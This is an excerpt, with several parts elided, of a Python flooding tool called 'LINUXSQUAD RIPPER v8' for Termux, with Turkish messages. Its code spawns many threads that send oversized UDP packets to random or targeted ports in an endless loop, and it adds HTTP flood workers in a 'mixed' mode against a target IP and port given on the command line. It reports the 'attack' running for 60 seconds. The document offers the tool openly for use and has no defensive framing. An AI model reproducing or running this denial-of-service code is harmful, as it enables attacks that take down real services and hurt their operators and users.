...
print("\033[92m")
print("╔══════════════════════════════════════════════════════════════════════════════╗")
print("║                    LINUXSQUAD RIPPER v8 - TERMUX FIXED v6                   ║")
print("║                  ULTRA GÜÇLÜ UDP AĞIRLIKLI - 60 SN                           ║")
print("╚══════════════════════════════════════════════════════════════════════════════╝")
print("\033[0m")
...
if len(sys.argv) < 3:
    ...
    print("   Örnek : python ripper.py 127.0.0.1 80 400 mixed")
    sys.exit(1)
...
def udp_flood_worker():
    ...
    while True:
        try:
            tport = random.randint(1, 65535) if random.random() > 0.15 else port
            size = random.randint(16384, 65500)          # Çok büyük paketler
...
# ===================== ANA PROGRAM =====================
print(f"\033[91m[+] Hedef → {target}:{port} | Concurrency → {concurrency} | Method → {method.upper()} | Süre → {DURATION}s\033[0m")
...
# UDP (Çok daha fazla ağırlık)
if method in ["udp", "mixed"]:
    udp_count = int(concurrency * 0.85) if method == "mixed" else concurrency
    print(f"\033[92m[+] {udp_count} ULTRA UDP Worker başlatılıyor...\033[0m")
    for _ in range(udp_count):
        threading.Thread(target=udp_flood_worker, daemon=True).start()

# HTTP
if method in ["http", "mixed"]:
    http_count = int(concurrency * 0.15) if method == "mixed" else max(30, concurrency//4)
...
print(f"\033[93m[+] {DURATION} saniye boyunca saldırı devam ediyor... (Daha Güçlü Mod)\033[0m")
time.sleep(DURATION)
